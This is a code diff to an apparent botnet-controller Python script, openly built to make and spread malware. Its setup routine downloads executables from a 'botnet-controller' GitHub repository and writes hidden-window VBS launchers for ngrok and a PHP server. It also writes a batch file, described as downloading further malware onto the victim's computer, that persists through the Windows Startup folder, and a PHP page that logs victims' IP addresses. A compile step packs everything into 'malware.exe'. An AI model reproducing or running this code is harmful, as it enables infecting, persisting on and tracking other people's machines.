@@ -4,6 +4,7 @@ from os import system
 from os.path import exists
 from sys import exit
 from os import chdir
+from os import curdir
 
 
 
@@ -16,17 +17,17 @@ def sys_check():
 def banner():
     print('''
     
-    ⣿⡏⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿
-    ⣿⣿⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⣿
-    ⣿⣿⣧⡀⠀⠀⠀⠀⠙⠿⠿⠿⠻⠿⠿⠟⠿⠛⠉⠀⠀⠀⠀⠀⣸⣿
-    ⣿⣿⣿⣷⣄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿
-    ⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣴⣿⣿⣿⣿
-    ⣿⣿⣿⣿⡟⠀⠀⢰⣹⡆⠀⠀⠀⠀⠀⠀⣭⣷⠀⠀⠀⠸⣿⣿⣿⣿
-    ⣿⣿⣿⣿⠃⠀⠀⠈⠉⠀⠀⠤⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⢿⣿⣿⣿
-    ⣿⣿⣿⣿⢾⣿⣷⠀⠀⠀⠀⡠⠤⢄⠀⠀⠀⠠⣿⣿⣷⠀⢸⣿⣿⣿
-    ⣿⣿⣿⣿⡀⠉⠀⠀⠀⠀⠀⢄⠀⢀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿
-    ⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿
-    ⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
+        ⣿⡏⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿
+        ⣿⣿⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⣿
+        ⣿⣿⣧⡀⠀⠀⠀⠀⠙⠿⠿⠿⠻⠿⠿⠟⠿⠛⠉⠀⠀⠀⠀⠀⣸⣿
+        ⣿⣿⣿⣷⣄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿
+        ⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣴⣿⣿⣿⣿
+        ⣿⣿⣿⣿⡟⠀⠀⢰⣹⡆⠀⠀⠀⠀⠀⠀⣭⣷⠀⠀⠀⠸⣿⣿⣿⣿
+        ⣿⣿⣿⣿⠃⠀⠀⠈⠉⠀⠀⠤⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⢿⣿⣿⣿
+        ⣿⣿⣿⣿⢾⣿⣷⠀⠀⠀⠀⡠⠤⢄⠀⠀⠀⠠⣿⣿⣷⠀⢸⣿⣿⣿
+        ⣿⣿⣿⣿⡀⠉⠀⠀⠀⠀⠀⢄⠀⢀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿
+        ⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿
+        ⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
     
     ''')
 
@@ -52,21 +53,21 @@ def setup():#working
     system('curl https://windows.php.net/downloads/releases/php-7.4.29-Win32-vc15-x86.zip --output php.zip')
     
     #downloading bat2exe zipped
-    system('curl https://github.com/canosaur/botnet-controller/raw/main/b2e.exe --output b2e.exe')
+    system('curl https://raw.githubusercontent.com/canosaur/botnet-controller/main/b2e.exe --output b2e.exe')
     
     #downloading hammer.zip(exe)
-    system('curl https://github.com/canosaur/botnet-controller/raw/main/ham.exe --output ham.exe')
+    system('curl https://raw.githubusercontent.com/canosaur/botnet-controller/main/ham.exe --output ham.exe')
     
     #downloading win.zip(exe)
-    system('curl https://github.com/canosaur/botnet-controller/raw/main/win.exe --output win.exe')
+    system('curl https://raw.githubusercontent.com/canosaur/botnet-controller/main/win.exe --output win.exe')
     
     
     #make `self-make` files
     #to run ngrok in background
-    open('ngrok.vbs','w').write('Set oShell = CreateObject ("Wscript.Shell")\nDim strArgs\nstrArgs = "cmd /c ngrok.exe http 8080"\noShell.Run strArgs, 0, false')
+    open('ngrok.vbs','w').write('Set oShell = CreateObject ("Wscript.Shell")\nDim strArgs\nstrArgs = "cmd /c ngrok.exe http 4974"\noShell.Run strArgs, 0, false')
 
     #to run php in background
-    open('php.vbs','w').write('Set oShell = CreateObject ("Wscript.Shell")\nDim strArgs\nstrArgs = "cmd /c php.exe -S localhost:8080"\noShell.Run strArgs, 0, false')
+    open('php.vbs','w').write('Set oShell = CreateObject ("Wscript.Shell")\nDim strArgs\nstrArgs = "cmd /c php.exe -S localhost:4974"\noShell.Run strArgs, 0, false')
     
     #the setup file which downloads further malware into the victim's computer
     open('setup.bat','w').write('echo win.exe URL > "%appdata%\\Microsoft\\Windows\\Templates\\win.bat"\necho Set oShell = CreateObject ("Wscript.Shell") > win.vbs\necho Dim strArgs >> win.vbs\necho strArgs = "cmd /c %appdata%\\Microsoft\\Windows\\Templates\\win.bat" >> win.vbs\necho oShell.Run strArgs, 0, false >> win.vbs\n\nmove win.vbs "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"\nmove win.exe "%appdata%\\Microsoft\\Windows\\Templates\\"')
@@ -78,6 +79,7 @@ def setup():#working
     open('ip.php','w').write('<?php\n\nif (!empty($_SERVER[\'HTTP_CLIENT_IP\']))\n    {\n      $ipaddress = $_SERVER[\'HTTP_CLIENT_IP\']."\\r\\n";\n    }\nelseif (!empty($_SERVER[\'HTTP_X_FORWARDED_FOR\']))\n    {\n      $ipaddress = $_SERVER[\'HTTP_X_FORWARDED_FOR\']."\\r\\n";\n    }\nelse\n    {\n      $ipaddress = $_SERVER[\'REMOTE_ADDR\']."\\r\\n";\n    }\n$useragent = " User-Agent: ";\n$browser = $_SERVER[\'HTTP_USER_AGENT\'];\n\n\n$file = \'bots\';\n$victim = "IP: ";\n$fp = fopen($file, \'a\');\n\nfwrite($fp, $victim);\nfwrite($fp, $ipaddress);\nfwrite($fp, $useragent);\nfwrite($fp, $browser);\n\n\nfclose($fp);\n')
     
     open('bots','w').write('')
+    open('jobs','w').write('')
 
     
     print('Extracting files...')
@@ -100,6 +102,7 @@ def setup():#working
 def main():#working
 
     system('cls')
+    if exists('files'):chdir('files')
     
     banner()
 
@@ -199,7 +202,8 @@ def make():#working
     open('setup.exe.bat','w').write(a)
 
     print('Compiling malware...')
-    system('b2e.exe /bat setup.exe.bat /exe malware.exe /invisible /include win.exe /overwrite')
+    #system('b2e.exe /bat setup.exe.bat /exe malware.exe /invisible /include win.exe /overwrite')
+    system('b2e.exe /bat setup.exe.bat /exe malware.exe /include win.exe /overwrite')
 
     print('Compilation of file completed, moving file to desktop..')
     system(r'move malware.exe %userprofile%\Desktop')
